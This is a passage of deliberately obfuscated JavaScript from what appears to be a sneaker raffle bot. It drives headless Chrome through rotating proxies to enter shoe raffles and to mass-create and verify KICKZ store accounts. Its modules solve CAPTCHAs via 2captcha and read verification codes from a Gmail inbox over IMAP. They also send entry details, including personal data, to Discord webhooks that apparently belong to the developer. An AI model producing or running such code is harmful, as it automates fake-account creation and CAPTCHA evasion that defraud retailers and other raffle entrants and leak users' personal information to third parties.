                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x1564f0 = await _0x559dec(_0xa22213[_0x3dd5c7], _0x1605af, 'dev', ![]), _0x3243e7 = await _0x559dec(_0xa22213[_0x3dd5c7], _0x1605af, 'pub', ![]);
                    const _0x3e611d = {
                        'succesDEVMSG': { 'embeds': [_0x1564f0] },
                        'succesPUBMSG': { 'embeds': [_0x3243e7] }
                    };
                    if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                        try {
                            await _0x48936e(_0x4ae33b['webhook'], _0x3e611d['succesDEVMSG']);
                        } catch {
                        }
                    await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x3e611d['succesDEVMSG']), await _0x41ed31(0xc8);
                    try {
                        await _0x48936e(_0x22a07c, _0x3e611d['succesPUBMSG']);
                    } catch {
                    }
                    if (_0xa22213[_0x3dd5c7]['Email'] == '' || _0xa22213[_0x3dd5c7]['Url'] == '' || _0xa22213[_0x3dd5c7]['FirstName'] == '' || _0xa22213[_0x3dd5c7]['LastName'] == '') {
                        console['log'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4ae33b['useRandomProxy'] = ![])
                        var _0x3f1f87 = _0x17ad82[_0x3dd5c7]['split'](':');
                    else
                        var _0x1c23b3 = Math['round'](Math['random']() * (_0x17ad82['length'] - 0x1)), _0x3f1f87 = _0x17ad82[_0x1c23b3]['split'](':');
                    var _0x55ea93;
                    try {
                        _0x55ea93 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3f1f87[0x0] + ':' + _0x3f1f87[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x55ea93 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3f1f87[0x0] + ':' + _0x3f1f87[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5bc31b = await _0x55ea93['newPage']();
                        await _0x5bc31b['authenticate']({
                            'username': '' + _0x3f1f87[0x2],
                            'password': '' + _0x3f1f87[0x3]
                        }), console['log'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5bc31b['setRequestInterception'](!![]), _0x5bc31b['on']('request', _0x3cb061 => {
                            _0x3cb061['resourceType']() === 'image' || _0x3cb061['resourceType']() === 'font' || _0x3cb061['resourceType']() === 'media' ? _0x3cb061['abort']() : _0x3cb061['continue']();
                        });
                        try {
                            await _0x5bc31b['goto']('' + _0xa22213[_0x3dd5c7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x5bc31b['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5bc31b['type']('#comp_firstname', '' + _0xa22213[_0x3dd5c7]['FirstName']), await _0x5bc31b['waitForSelector']('#comp_lastname'), await _0x5bc31b['type']('#comp_lastname', '' + _0xa22213[_0x3dd5c7]['LastName']), await _0x5bc31b['waitForSelector']('#comp_email'), await _0x5bc31b['type']('#comp_email', '' + _0xa22213[_0x3dd5c7]['Email']), await _0x5bc31b['waitForSelector']('#comp_paypalemail'), await _0x5bc31b['type']('#comp_paypalemail', '' + _0xa22213[_0x3dd5c7]['Email']), await _0x5bc31b['waitForSelector']('#comp_mobile_end'), await _0x5bc31b['type']('#comp_mobile_end', '' + _0xa22213[_0x3dd5c7]['Phone']), await _0x5bc31b['waitForSelector']('#comp_dob'), await _0x5bc31b['type']('#comp_dob', '08/09/1992'), console['log'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0xa22213[_0x3dd5c7]['Size'] == 'RANDOM') {
                            const _0x22d529 = await _0x5bc31b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x21cfdc => {
                                return _0x21cfdc['map'](_0x121524 => _0x121524['value']);
                            });
                            var _0x13c521 = Math['round'](Math['random']() * (_0x22d529['length'] - 0x2));
                            await _0x5bc31b['select']('#shoesize', _0x22d529[_0x13c521 + 0x1]), await _0x41ed31(0x3e8);
                        } else {
                            const _0x2fb296 = await _0x5bc31b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2fd77d => {
                                return _0x2fd77d['map'](_0x5b9f3a => _0x5b9f3a['innerText']);
                            }), _0x3edb2f = await _0x5bc31b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xee4253 => {
                                return _0xee4253['map'](_0x3fba6d => _0x3fba6d['value']);
                            });
                            var _0x286310 = _0xa22213[_0x3dd5c7]['Size'];
                            for (var _0x2cd5c7 = 0x1; _0x2cd5c7 < _0x3edb2f['length']; _0x2cd5c7++) {
                                var _0x31a573 = _0x2fb296[_0x2cd5c7]['split']('\x20')[0x0];
                                if (_0x31a573 == _0x286310) {
                                    await _0x5bc31b['select']('#shoesize', _0x3edb2f[_0x2cd5c7]);
                                    break;
                                } else {
                                    if (_0x2cd5c7 + 0x1 == _0x3edb2f['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5bc31b['waitForSelector']('#comp_address1'), await _0x5bc31b['type']('#comp_address1', _0xa22213[_0x3dd5c7]['Address1'] + '\x20' + _0xa22213[_0x3dd5c7]['HouseNumber']), await _0x5bc31b['waitForSelector']('#comp_address2'), await _0x5bc31b['type']('#comp_address2', '' + _0xa22213[_0x3dd5c7]['Address2']), await _0x5bc31b['waitForSelector']('#comp_address2'), await _0x5bc31b['type']('#comp_address3', '' + _0xa22213[_0x3dd5c7]['City']), await _0x5bc31b['waitForSelector']('#comp_postcode'), await _0x5bc31b['type']('#comp_postcode', '' + _0xa22213[_0x3dd5c7]['Zip']), console['log'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x41ed31(0x4b0), await _0x5bc31b['click']('label#emailhold'), await _0x41ed31(0x5dc), await _0x5bc31b['click']('#preauth_tandc_email\x20>\x20label'), await _0x41ed31(0x5dc), await _0x5bc31b['click']('#submit');
                        try {
                            await _0x5bc31b['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20' + _0x3dfcf2['blue']('Awaiting\x20Paypal\x20Payment')), _0x55ea93['on']('targetcreated', async _0x4c2dca => {
                            if (_0x4c2dca['type']() === 'page') {
                                const _0x2f051d = await _0x4c2dca['page']();
                                async function _0x50df0c() {
                                    try {
                                        await _0x5bc31b['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3aa834 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2dc7da() {
                                    try {
                                        await _0x5bc31b['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1330d2 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2dc7da(), _0x50df0c(), await _0x41ed31(0x493e0);
                            }
                        });
                        async function _0x2ce283() {
                            for (let _0x49ca46 = 0x0; _0x49ca46 < 0x12c; _0x49ca46++) {
                                if (_0x1330d2 == !![]) {
                                    _0x2a2d03 = 'no', _0x13e83d(_0xa22213[_0x3dd5c7], _0x1605af), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                                        try {
                                            await _0x48936e(_0x4ae33b['webhook'], _0x3e611d['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x3e611d['succesDEVMSG']), await _0x41ed31(0xc8);
                                    try {
                                        await _0x48936e(_0x22a07c, _0x3e611d['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3aa834)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x41ed31(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x41ed31(0xbb8), await _0x5bc31b['click']('.zoid-outlet'), await _0x41ed31(0x7d0), await _0x2ce283();
                    } catch (_0x2d73bb) {
                        console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20' + _0x2d73bb)), _0x6e5baa = '' + _0x2d73bb;
                        var _0x1cd3b7 = await _0x559dec(_0xa22213[_0x3dd5c7], _0x1605af, 'dev', !![], _0x6e5baa);
                        _0x3e611d['errorDEV'] = { 'embeds': [_0x1cd3b7] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x3e611d['errorDEV']), await _0x48936e(_0x36657d, _0x3e611d['errorDEV']);
                    } finally {
                        _0x55ea93 && _0x55ea93['close']();
                        if (_0x2a2d03 == 'yes' && _0xa55fea != 0x5 && _0x6e5baa != 'Size\x20Not\x20Found') {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x1605af['name'] + ']\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa55fea + '\x20/\x205)')), _0x3dd5c7 = _0x3dd5c7 - 0x1, _0xa55fea = _0xa55fea + 0x1;
                            continue;
                        }
                        _0x2a2d03 == 'yes' && _0xa55fea >= 0x5 && (_0x2504ad(afew[_0x3dd5c7], _0x1605af), _0x2a2d03 = 'no', _0xa55fea = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x3bcf19, _0xef0768, _0x43c49a) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3cea62 = 0x0; _0x3cea62 < _0xef0768['length']; _0x3cea62++) {
                        const _0x195849 = 'https://www.kickz.com/login';
                        if (_0x4dc02d != 'yes')
                            var _0x4dc02d = '', _0x4ea076 = 0x0;
                        _0x445891(_0x3bcf19['name'] + '\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20/\x20' + _0xef0768['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        try {
                            await _0x101e1b(_0xef0768, _0x3cea62);
                        } catch {
                            _0x4dc02d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x54c9c3 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x128b96
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4ae33b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x8a26c5
                                }
                            ]
                        }];
                        const _0x15a987 = { 'embeds': _0x54c9c3 };
                        var _0xcca7d = await _0x559dec(_0xef0768[_0x3cea62], _0x3bcf19, 'acc', ![]);
                        const _0x2aca46 = { 'succesDEVMSG': { 'embeds': [_0xcca7d] } };
                        if (_0xef0768[_0x3cea62]['Email'] == '' || _0xef0768[_0x3cea62]['FirstName'] == '' || _0xef0768[_0x3cea62]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xef0768[_0x3cea62]['Password'] == '' && (_0xef0768[_0x3cea62]['Password'] = 'JRaffles23!');
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x4c30de = _0x43c49a[_0x3cea62]['split'](':');
                        else
                            var _0x467e6d = Math['round'](Math['random']() * (_0x43c49a['length'] - 0x1)), _0x4c30de = _0x43c49a[_0x467e6d]['split'](':');
                        var _0x274774;
                        try {
                            _0x274774 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c30de[0x0] + ':' + _0x4c30de[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x274774 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c30de[0x0] + ':' + _0x4c30de[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x536d9b = await _0x274774['newPage']();
                            await _0x536d9b['authenticate']({
                                'username': '' + _0x4c30de[0x2],
                                'password': '' + _0x4c30de[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x536d9b['setRequestInterception'](!![]), _0x536d9b['on']('request', _0x1c3f8f => {
                                _0x1c3f8f['resourceType']() === 'image' || _0x1c3f8f['resourceType']() === 'font' || _0x1c3f8f['resourceType']() === 'media' ? _0x1c3f8f['abort']() : _0x1c3f8f['continue']();
                            }), await _0x536d9b['goto'](_0x195849), await _0x41ed31(0xbb8), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x536d9b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x536d9b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x536d9b['waitForSelector']('#button-register'), await _0x41ed31(0x7d0), await _0x536d9b['evaluate'](() => {
                                const _0x5b735e = document['querySelector']('#button-register');
                                _0x5b735e['click']();
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x41ed31(0x1388), await _0x536d9b['waitForSelector']('#customer_salutation'), await _0x536d9b['select']('#customer_salutation', 'mr'), await _0x41ed31(0x7d0), await _0x536d9b['waitForSelector']('#customer_firstname'), await _0x536d9b['type']('#customer_firstname', '' + _0xef0768[_0x3cea62]['FirstName']), await _0x41ed31(0x352), await _0x536d9b['waitForSelector']('#customer_lastname'), await _0x536d9b['type']('#customer_lastname', '' + _0xef0768[_0x3cea62]['LastName']), await _0x41ed31(0x352), await _0x536d9b['type']('#email-input', '' + _0xef0768[_0x3cea62]['Email']), await _0x41ed31(0x352), await _0x536d9b['type']('#email-confirm-input', '' + _0xef0768[_0x3cea62]['Email']), await _0x41ed31(0x352), await _0x536d9b['type']('#register-password', '' + _0xef0768[_0x3cea62]['Password']), await _0x41ed31(0x352), await _0x536d9b['type']('#password-confirm', '' + _0xef0768[_0x3cea62]['Password']), await _0x41ed31(0x352), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x536d9b['click']('#consent'), await _0x41ed31(0x1f4);
                            const _0x16e80f = await _0x536d9b['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x16e80f) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x536d9b['click']('#buttonRegister');
                            try {
                                await _0x536d9b['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0xef0768[_0x3cea62]['Email']), await _0x41ed31(0x4b0);
                            async function _0x41b7b4() {
                                var _0x12a86a, _0x58c067 = ![];
                                for (var _0x649f78 = 0x0; _0x649f78 < 0x18; _0x649f78++) {
                                    async function _0x468e40() {
                                        var _0x139b63 = new _0x2fa2c3({
                                            'user': _0x4ae33b['masterMail'],
                                            'password': _0x4ae33b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x36a2a0(_0x51acf4) {
                                            _0x139b63['openBox']('INBOX', ![], _0x51acf4);
                                        }
                                        _0x139b63['once']('ready', function () {
                                            console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x36a2a0(function (_0x4c1d9b, _0x231ea8) {
                                                console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4c1d9b)
                                                    throw _0x4c1d9b;
                                                _0x139b63['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x3668e5, _0x160151) {
                                                    if (!_0x160151 || !_0x160151['length'])
                                                        console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x139b63['end']();
                                                    else {
                                                        var _0x584e1d = _0x139b63['seq']['fetch'](_0x160151, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x584e1d['on']('message', function (_0x59c5b1, _0x480873) {
                                                            var _0x466f98 = '(#' + _0x480873 + ')\x20';
                                                            _0x59c5b1['on']('body', function (_0xbc6cdc, _0x3273e6) {
                                                                _0x44103a(_0xbc6cdc, (_0xcd7e9a, _0x3cb07b) => {
                                                                    if (_0x3cb07b['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x44788b = _0x3cb07b['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3c3790 = _0x44788b[0x1]['split']('<')[0x0];
                                                                        _0x12a86a = _0x3c3790;
                                                                    }
                                                                });
                                                            }), _0x59c5b1['once']('end', function () {
                                                            });
                                                        }), _0x584e1d['once']('error', function (_0x34d673) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x584e1d['once']('end', function () {
                                                            _0x139b63['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x139b63['once']('error', function (_0x3e4213) {
                                            console['log'](_0x3dfcf2['red'](_0x3e4213['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x58c067 = !![];
                                        }), _0x139b63['once']('end', async function () {
                                        }), _0x139b63['connect']();
                                    }
                                    _0x468e40(), await _0x41ed31(0x1388);
                                    if (_0x12a86a)
                                        return _0x12a86a;
                                    if (_0x58c067)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x649f78 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x41b7b4(), _0x41ed31(0x320), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Verifying..'), await _0x536d9b['type']('#verificationCode', code), await _0x41ed31(0x1f4), await _0x536d9b['click']('#buttonVerify'), await _0x41ed31(0x190), await _0x536d9b['click']('#buttonVerify'), await _0x41ed31(0x3e8);
                            try {
                                await _0x536d9b['waitForSelector']('div.b-user_greeting'), _0x4dc02d = 'no', console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Account\x20' + _0xef0768[_0x3cea62]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x223df9['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0xef0768[_0x3cea62]['Email'] + ',' + _0xef0768[_0x3cea62]['Password'] + ','), console['log'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Account\x20' + _0xef0768[_0x3cea62]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2aca46['succesDEVMSG']);
                                } catch {
                                }
                                await _0x48936e(_0x1041df, _0x2aca46['succesDEVMSG']);
                            } catch {
                                _0x4dc02d = 'no', console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x47f1cb) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20' + _0x47f1cb)), _0x54c9c3[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x54c9c3[0x0]['description'] = '' + _0x47f1cb, await _0x48936e(_0x36657d, _0x15a987), _0x4dc02d = 'yes';
                        } finally {
                            _0x274774 && _0x274774['close']();
                            if (_0x4dc02d == 'yes' && _0x4ea076 != 0x5) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3bcf19['name'] + ']\x20Task\x20' + (_0x3cea62 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ea076 + '\x20/\x205)')), _0x3cea62 = _0x3cea62 - 0x1, _0x4ea076 = _0x4ea076 + 0x1;
                                continue;
                            }
                            _0x4dc02d == 'yes' && _0x4ea076 >= 0x5 && (_0x2504ad(_0xef0768[_0x3cea62], _0x3bcf19), _0x4dc02d = 'no', _0x4ea076 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x2e2965, _0x33df09, _0x124c9c) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f9cb7 = 0x0; _0x1f9cb7 < _0x33df09['length']; _0x1f9cb7++) {
                        var _0x4223f1;
                        if (_0x316510 != 'yes')
                            var _0x316510 = '', _0x3441d9 = 0x0;
                        _0x445891(_0x2e2965['name'] + '\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20/\x20' + _0x33df09['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        var _0x54f0b3 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x128b96
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x33df09[_0x1f9cb7]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x33df09[_0x1f9cb7]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4ae33b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x8a26c5
                                }
                            ]
                        }];
                        let _0x8bfc7e = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x34e057 = ![];
                        for (key of _0x8bfc7e) {
                            if (_0x33df09[_0x1f9cb7][key] == '' || !_0x33df09[_0x1f9cb7][key]) {
                                console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x34e057 = !![];
                                break;
                            }
                        }
                        if (_0x34e057) {
                            await _0x41ed31(0x1f4);
                            continue;
                        }
                        var _0x150100 = await _0x559dec(_0x33df09[_0x1f9cb7], _0x2e2965, 'dev', ![]), _0x31908b = await _0x559dec(_0x33df09[_0x1f9cb7], _0x2e2965, 'pub', ![]);
                        const _0x2feb7b = {
                            'succesDEVMSG': { 'embeds': [_0x150100] },
                            'succesPUBMSG': { 'embeds': [_0x31908b] }
                        };
                        try {
                            await _0x101e1b(_0x33df09, _0x1f9cb7);
                        } catch {
                            _0x316510 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x3ca975 = _0x124c9c[_0x1f9cb7]['split'](':');
                        else
                            var _0x303a61 = Math['round'](Math['random']() * (_0x124c9c['length'] - 0x1)), _0x3ca975 = _0x124c9c[_0x303a61]['split'](':');
                        var _0x209ff2;
                        try {
                            _0x209ff2 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3ca975[0x0] + ':' + _0x3ca975[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x209ff2 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3ca975[0x0] + ':' + _0x3ca975[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a6120 = await _0x209ff2['newPage']();
                            await _0x3a6120['authenticate']({
                                'username': '' + _0x3ca975[0x2],
                                'password': '' + _0x3ca975[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a6120['setRequestInterception'](!![]), _0x3a6120['on']('request', _0x5b2ca6 => {
                                _0x5b2ca6['resourceType']() === 'image' || _0x5b2ca6['resourceType']() === 'font' || _0x5b2ca6['resourceType']() === 'media' ? _0x5b2ca6['abort']() : _0x5b2ca6['continue']();
